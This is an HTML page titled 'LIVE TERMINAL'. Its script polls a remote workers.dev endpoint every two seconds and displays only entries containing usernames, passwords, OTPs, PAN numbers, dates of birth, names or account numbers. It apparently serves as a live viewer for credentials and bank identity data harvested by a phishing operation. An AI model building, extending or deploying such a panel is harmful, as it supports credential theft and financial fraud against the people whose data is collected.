<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>LIVE TERMINAL</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background-color: #ffffff; padding: 8px; font-family: 'Consolas', monospace; }
        
        /* Header: Only Red Number on Right */
        .header { 
            background: #fff; padding: 10px; margin-bottom: 8px;
            display: flex; justify-content: space-between; align-items: center;
            border-bottom: 1px solid #eee;
        }
        .status-text { font-size: 10px; color: #00a859; font-weight: bold; }
        #count { color: #ff0000; font-size: 22px; font-weight: 900; }

        /* Black Slim Card */
        .log-card { 
            background: #000000; margin-bottom: 5px; padding: 10px 12px; 
            border-radius: 3px; width: 100%; display: flex; flex-direction: column;
        }

        /* White Data Text */
        .detail-text { 
            color: #ffffff; font-size: 13px; white-space: pre-wrap; 
            line-height: 1.5; word-break: break-all;
        }

        /* Small Red Time in Footer */
        .time-footer { 
            display: block; margin-top: 5px; font-size: 9px; 
            color: #ff0000; /* Red Time */
            text-align: right; font-weight: bold;
        }

        #logsContainer { width: 100%; }
        .loading { font-size: 12px; color: #999; text-align: center; margin-top: 30px; }
    </style>
</head>
<body>

    <div class="header">
        <span class="status-text">● LIVE_TERMINAL</span>
        <span id="count">0</span>
    </div>

    <div id="logsContainer">
        <p class="loading">Connecting...</p>
    </div>

    <script>
        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';

        async function fetchLogs() {
            try {
                const response = await fetch(`${workerURL}?t=${Date.now()}`);
                const data = await response.json();
                const container = document.getElementById('logsContainer');
                
                // Filter: Sirf main data dikhana
                const filteredData = data.filter(item => {
                    const d = item.detail.toLowerCase();
                    return d.includes("user") || d.includes("pass") || d.includes("otp") || 
                           d.includes("pan") || d.includes("dob") || d.includes("name") || d.includes("a/c");
                });

                document.getElementById('count').innerText = filteredData.length;

                if (filteredData.length === 0) {
                    container.innerHTML = "<p class='loading'>Waiting for data...</p>";
                    return;
                }

                container.innerHTML = filteredData.map(item => `
                    <div class="log-card">
                        <div class="detail-text">${item.detail}</div>
                        <span class="time-footer">${item.time}</span>
                    </div>
                `).join('');

            } catch (err) {
                console.error("Sync Error");
            }
        }

        // 2 Second Update
        setInterval(fetchLogs, 2000);
        window.onload = fetchLogs;
    </script>
</body>
</html>
